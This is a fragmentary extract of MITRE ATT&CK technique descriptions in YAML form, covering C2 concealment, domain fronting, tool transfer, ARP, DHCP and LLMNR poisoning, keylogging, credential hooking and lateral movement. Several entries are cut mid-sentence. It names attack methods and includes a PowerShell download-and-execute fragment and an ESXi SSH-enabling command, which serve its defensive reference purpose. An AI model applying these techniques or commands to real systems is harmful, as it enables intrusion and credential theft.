        2020) Command and control (C2) communications are hidden (but not necessarily
        encrypted) in an attempt to make the content more difficult to discover or
        decipher and to make the communication less conspicuous and hide commands
        from being seen. This encompasses many methods, such as adding junk data to
        protocol traffic, using steganography, or impersonating legitimate protocols. '

        Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.

        Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)

        system over the Web service channel. Compromised systems may leverage popular
        websites and social media to host command and control (C2) instructions. Those
        infected systems can then send the output from those commands back over that
        Web service channel. The return traffic may occur in a variety of ways, depending
        on the Web service being utilized. For example, the return traffic may take
        the form of the compromised system posting a comment on a forum, issuing a
        pull request to development project, updating a document hosted on a Web service,
        or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism
        for C2 may give a significant amount of cover due to the likelihood that hosts
        within a network are already communicating with them prior to a compromise.
        Using common services, such as those offered by Google or Twitter, makes it
        easier for adversaries to hide in expected noise. Web service providers commonly
        use SSL/TLS encryption, giving adversaries an added level of protection. "

      description: |-
        Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.

        For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).

      name: Non-Application Layer Protocol
      description: |-
        Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

        ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

        In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)

      description: "Adversaries may impersonate legitimate protocols or web service
        traffic to disguise command and control activity and thwart analysis efforts.
        By impersonating legitimate protocols or web services, adversaries can make
        their command and control traffic blend in with legitimate network traffic.
        \ \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look
        like subsequent traffic is SSL/TLS encrypted, potentially interfering with
        some security tooling, or to make the traffic look like it is related with
        a trusted entity. \n\nAdversaries may also leverage legitimate protocols to
        impersonate expected web traffic or trusted services. For example, adversaries
        may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted
        data to disguise C2 communications or mimic legitimate services such as Gmail,
        Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation:

      description: |-
        Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

        For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.

      description: "Adversaries may transfer tools or other files from an external
        system into a compromised environment. Tools or files may be copied from an
        external adversary-controlled system to the victim network through the command
        and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095).
        Once present, adversaries may also transfer/spread tools between victim devices
        within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).
        \n\nOn Windows, adversaries may use various utilities to download tools, such
        as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160),
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such
        as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>.
        On Linux and macOS systems, a variety of utilities also exist, such as `curl`,
        `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)
        \ A number of these tools, such as `wget`, `curl`, and `scp`, also exist on
        ESXi. After downloading a file, a threat actor may attempt to verify its integrity
        by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google
        Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse
        installers and package managers, such as `yum` or `winget`, to download tools
        to victim hosts. Adversaries have also abused file application features, such
        as the Windows `search-ms` protocol handler, to deliver malicious files to
        victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204)
        (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566)
        lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred
        using various [Web Service](https://attack.mitre.org/techniques/T1102)s as
        well as native or otherwise present tools on the victim system.(Citation:
        PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage
        services that sync between a web-based and an on-premises client, such as
        Dropbox or OneDrive, to transfer files onto victim systems. For example, by
        compromising a cloud account and logging into the service's web portal, an
        adversary may be able to trigger an automatic syncing process that transfers
        the file onto the victim's machine.(Citation: Dropbox Malware Sync)"

      description: |-
        Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.

        C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)

        Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)

        Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)

      description: |-
        Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.

        By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.

      name: Dead Drop Resolver
      description: |-
        Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

      description: |-
        Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

        For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

        Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

      description: "Adversaries may log user keystrokes to intercept credentials as
        the user types them. Keylogging is likely to be used to acquire credentials
        for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
        efforts are not effective, and may require an adversary to intercept keystrokes
        on a system for a substantial period of time before credentials can be successfully
        captured. In order to increase the likelihood of capturing credentials quickly,
        an adversary may also perform actions such as clearing browser cookies to
        force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging
        is the most prevalent type of input capture, with many different ways of intercepting
        keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n*
        Hooking API callbacks used for processing keystrokes. Unlike [Credential API
        Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
        on API functions intended for processing keystroke data.\n* Reading raw keystroke

        adversaries may be able to collect this data directly from APIs or backend
        cloud storage objects, rather than through their front-end application or
        interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)).
        \n\nAdversaries may collect sensitive data from these cloud storage solutions.
        Providers typically offer security guides to help end users configure systems,
        though misconfigurations are a common problem.(Citation: Amazon S3 Security,
        2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud
        Storage Best Practices, 2019) There have been numerous incidents where cloud
        storage has been improperly secured, typically by unintentionally allowing
        public access to unauthenticated users, overly-broad access by all users,
        or even access for any anonymous person outside the control of the Identity
        Access Management system without even needing basic user permissions.\n\nThis
        open access may expose various types of sensitive data, such as credit cards,
        personally identifiable information, or medical records.(Citation: Trend Micro

        may also obtain then abuse leaked credentials from source repositories, logs,
        or other means as a way to gain access to cloud storage objects."

        Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

        In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

        By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.

      description: |-
        Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)

        A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.

        Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)

      name: DHCP Spoofing
      description: "Adversaries may redirect network traffic to adversary-owned systems
        by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting
        as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle
        (AiTM) position, adversaries may collect network communications, including
        passed credentials, especially those sent over insecure, unencrypted protocols.
        This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)
        or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP
        is based on a client-server model and has two functionalities: a protocol
        for providing network configuration settings from a DHCP server to a client
        and a mechanism for allocating network addresses to clients.(Citation: rfc2131)
        The typical server-client interaction is as follows: \n\n1. The client broadcasts
        a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which
        includes an available network address. \n\n3. The client broadcasts a `REQUEST`
        message, which includes the network address offered. \n\n4. The server acknowledges
        with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries
        may spoof as a rogue DHCP server on the victim network, from which legitimate
        hosts may receive malicious network configurations. For example, malware can
        act as a DHCP server and provide adversary-owned DNS servers to the victimized
        computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g)
        Through the malicious network configurations, an adversary may achieve the
        AiTM position, route client traffic through adversary-controlled systems,
        and collect information from the client network.\n\nDHCPv6 clients can receive
        network configuration information without being assigned an IP address by
        sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code>
        multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP
        server to respond to this request message with malicious network configurations.\n\nRather
        than establishing an AiTM position, adversaries may also abuse DHCP spoofing
        to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))
        by generating many broadcast DISCOVER messages to exhaust a network’s DHCP
        allocation pool. "

      description: "By responding to LLMNR/NBT-NS network traffic, adversaries may
        spoof an authoritative source for name resolution to force communication with
        an adversary controlled system. This activity may be used to collect or relay
        authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR)
        and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve
        as alternate methods of host identification. LLMNR is based upon the Domain
        Name System (DNS) format and allows hosts on the same local link to perform
        name resolution for other hosts. NBT-NS identifies systems on a local network
        by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries
        can spoof an authoritative source for name resolution on a victim network
        by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know
        the identity of the requested host, effectively poisoning the service so that
        the victims will communicate with the adversary controlled system. If the
        requested host belongs to a resource that requires identification/authentication,
        the username and NTLMv2 hash will then be sent to the adversary controlled
        system. The adversary can then collect the hash information sent over the
        wire through tools that monitor the ports for traffic or through [Network
        Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes
        offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to
        obtain the plaintext passwords.\n\nIn some cases where an adversary has access
        to a system that is in the authentication path between systems or when automated
        scans that use credentials attempt to authenticate to an adversary controlled
        system, the NTLMv1/v2 hashes can be intercepted and relayed to access and
        execute code against a target system. The relay step can happen in conjunction
        with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM
        Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may
        encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB,
        MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral
        tools may be used to poison name services within local networks such as NBNSpoof,
        Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation:

      description: |-
        An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

        In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)

      description: "Adversaries may setup email forwarding rules to collect sensitive
        information. Adversaries may abuse email forwarding rules to monitor the activities
        of a victim, steal information, and further gain intelligence on the victim
        or the victim’s organization to use as part of further exploits or operations.(Citation:
        US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries
        to maintain persistent access to victim's emails even after compromised credentials
        are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most
        email clients allow users to create inbox rules for various email functions,
        including forwarding to a different recipient. These rules may be created
        through a local email application, a web interface, or by command-line interface.
        Messages can be forwarded to internal or external recipients, and there are
        no restrictions limiting the extent of this rule. Administrators may also
        create forwarding rules for user accounts with the same considerations and
        outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation:
        Mac Forwarding Rules)\n\nAny user or administrator within the organization
        (or adversary with valid credentials) can create rules to automatically forward
        all received messages to another recipient, forward emails to different locations
        based on the sender, and more. Adversaries may also hide the rule by making
        use of the Microsoft Messaging API (MAPI) to modify the rule properties, making
        it hidden and not visible from Outlook, OWA or most Exchange Administration
        tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments,
        administrators may be able to enable email forwarding rules that operate organization-wide
        rather than on individual inboxes. For example, Microsoft Exchange supports
        transport rules that evaluate all mail an organization receives against user-specified
        conditions, then performs a user-specified action on mail that adheres to
        those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that
        abuse such features may be able to enable forwarding on all or specific mail
        an organization receives. "

        Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

        Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)

This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.

        Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.

        Once adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566) emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation: Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank Hack 2020)

        CRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.

      name: ARP Cache Poisoning
      description: |
        Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

        The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

        An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

        The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

        Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)

      description: "Adversaries may leverage information repositories to mine valuable
        information. Information repositories are tools that allow for storage of
        information, typically to facilitate collaboration or information sharing
        between users, and can store a wide variety of data that may aid adversaries
        in further objectives, such as Credential Access, Lateral Movement, or Defense
        Evasion, or direct access to the target information. Adversaries may also
        abuse external sharing features to share sensitive documents with recipients
        outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).
        \n\nThe following is a brief list of example information that may hold potential
        value to an adversary and may also be found on an information repository:\n\n*
        Policies, procedures, and standards\n* Physical / logical network diagrams\n*
        System architecture diagrams\n* Technical system documentation\n* Testing
        / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

        the following:\n\n* Storage services such as IaaS databases, enterprise databases,
        and more specialized platforms such as customer relationship management (CRM)
        databases \n* Collaboration platforms such as SharePoint, Confluence, and
        code repositories\n* Messaging platforms such as Slack and Microsoft Teams
        \n\nIn some cases, information repositories have been improperly secured,

        Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository
        that stores variable information accessible via SNMP in the form of object
        identifiers (OID). Each OID identifies a variable that can be read or set
        and permits active management tasks, such as configuration changes, through
        remote modification of these variables. SNMP can give administrators great
        insight in their systems, such as, system information, description of hardware,
        physical location, and software packages(Citation: SANS Information Security
        Reading Room Securing SNMP Securing SNMP). The MIB may also contain device
        operational information, including running configuration, routing table, and
        interface details.\n\nAdversaries may use SNMP queries to collect MIB content
        directly from SNMP-managed devices in order to collect network information

      description: "Adversaries may hook into Windows application programming interface
        (API) functions and Linux system functions to collect user credentials. Malicious
        hooking mechanisms may capture API or function calls that include parameters
        that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I
        Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),
        this technique focuses specifically on API functions that include parameters
        that reveal user credentials. \n\nIn Windows, hooking involves redirecting
        calls to these functions and can be implemented via:\n\n* **Hooks procedures**,
        which intercept and execute designated code in response to events such as
        messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation:
        Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**,
        which use modifications to a process’s IAT, where pointers to imported API
        functions are stored.(Citation: Elastic Process Injection July 2017)(Citation:
        Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking
        2015)\n* **Inline hooking**, which overwrites the first bytes in an API function

        HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic
        Hooking 2015)\n\nIn Linux and macOS, adversaries may hook into system functions
        via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment
        variables, which enables loading shared libraries into a program’s address
        space. For example, an adversary may capture credentials by hooking into the
        `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)"

        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)

        VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)

        Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)

      name: Taint Shared Content
      description: |2-

        Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

        A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)

        Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.

        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.

        SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).

        Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

        Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).

      description: |-
